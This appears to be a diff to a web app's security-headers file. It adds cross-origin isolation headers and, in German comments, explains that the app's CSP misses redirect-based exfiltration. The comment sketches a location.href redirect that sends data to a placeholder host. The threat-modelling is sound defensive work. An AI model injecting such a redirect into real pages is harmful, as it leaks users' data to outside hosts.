@@ -5,6 +5,8 @@
   Permissions-Policy: camera=(), microphone=(), geolocation=(), payment=(), usb=(), magnetometer=(), gyroscope=(), accelerometer=()
   Strict-Transport-Security: max-age=31536000; includeSubDomains
   X-Frame-Options: DENY
+  Cross-Origin-Opener-Policy: same-origin
+  Cross-Origin-Resource-Policy: same-origin
 
 # Warum script-src doppelt:
 #   script-src ist die Rueckfalloption fuer aeltere Browser, die die
@@ -18,8 +20,12 @@
 # Der verbliebene Rest waeren eingeschleuste Event-Handler-Attribute. Genau die
 # schliesst esc() aus heimplaner-data.js, das " und ' mitescaped.
 #
-# connect-src 'self' bleibt die wichtigste Zeile: selbst wenn doch etwas
-# ausgefuehrt wuerde, kaeme es nicht dazu, Daten nach aussen zu schicken.
+# connect-src 'self' blockt fetch/XHR/WebSocket zu fremden Zielen, ist aber
+# NICHT vollstaendig: eine simple Weiterleitung (location.href = 'https://
+# irgendwo.tld/?x=' + ...) faellt nicht unter connect-src und wird von keiner
+# Direktive hier eingefangen (die dafuer gedachte CSP-Direktive navigate-to
+# wird von keinem Browser unterstuetzt). esc() aus heimplaner-data.js bleibt
+# damit die eigentliche letzte Verteidigungslinie, nicht diese CSP.
 
 # Ausgelagerte Dateien duerfen zwischengespeichert werden; index.html nicht,
 # damit nach einem Deploy nicht auf eine veraltete Seite verwiesen wird.
